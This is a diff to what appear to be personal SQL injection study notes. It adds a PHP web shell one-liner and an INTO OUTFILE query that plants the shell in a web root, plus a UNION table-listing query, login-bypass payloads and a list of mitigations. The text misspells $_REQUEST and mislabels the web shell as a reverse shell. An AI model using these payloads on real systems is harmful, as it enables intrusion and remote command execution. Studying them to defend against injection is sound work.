@@ -227,7 +227,7 @@ SELECT user FROM mysql.user
 
 * To determine the privileges for the user:
 ```SQL
-SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE user='our-user';
+SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee='our-user';
 ```
 
 * We can also check if we have super privileges:
@@ -282,9 +282,21 @@ The location we want to write to is usually the root directory of the web server
 	* `/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt`
 	* `/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt`
 
-The file we want to write is usually a [[File Upload#Web Shell]].
-
+The file we want to write is usually a [[File Upload#Web Shell]]. This is a famous one-liner:
+```PHP
+<?php echo system($_REQEUST["command"]); ?>
 ```
+
+We can then write it using the above syntax:
+```SQL
+SELECT '<?php echo system($_GET["command"]); ?>' INTO OUTFILE '/root-directory/shell.php'
+```
+
+> Visiting the website with `/shell.php` at the end opens the reverse shell.
+> Entering commands as a query parameter with name `command` exectues them.
+ 
+```
+/shell.php?command=<enter-here>
 ```
 
 ---
@@ -337,6 +349,11 @@ SELECT * FROM information_schema.tables ;
 * TABLE_SCHEMA
 * TABLE_TYPE
 
+* list all tables in a database.
+```SQL
+UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev';
+```
+
 * To get the information of a table.
 ```SQL
 SELECT * FROM information_schema.columns WHERE table_name= '';
@@ -381,6 +398,7 @@ SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
 
 ```SQL
 ' OR 'a'='a
+' OR 'a'='a'
 ' UNION SELECT Username, Password FROM Accounts/users WHERE 'a'='a
 ' UNION SELECT user(); -- -
 2' AND 1=1; -- -
@@ -421,5 +439,9 @@ SELECT username password FROM users
 
 * Using parameterized queries instead of string concatention within the query.
 	* The string used in the query must be a constant and not contain variables.
+* Input sanitization.
+* Input validation.
+* Adding user privileges, so that users have access to certain functions in certain tables.
+* Adding a WAF, Web Application [[Firewall]]. This will monitor and check for weird queries, such as access to special tables like `information_schema`.
 
 ---
